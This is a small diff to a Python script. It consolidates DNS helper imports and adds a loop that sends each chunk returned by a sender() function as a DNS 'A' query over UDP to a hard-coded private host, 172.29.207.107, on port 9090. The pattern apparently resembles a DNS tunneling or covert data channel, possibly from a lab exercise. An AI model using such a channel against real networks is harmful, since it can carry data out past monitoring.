@@ -1,6 +1,5 @@
 import sys
-from dns_RD0 import build_message
-from dns_RD0 import send_udp_message
+from dns import build_message, send_udp_message
 
 def sender(ws, address=""):
     offset = 0
@@ -36,3 +35,7 @@ else:
 
 query = sender(ws, url)
 print(query)
+
+for i in range(0, len(query)):
+    message = build_message("A", query[i])
+    response = send_udp_message(message, "172.29.207.107", 9090)
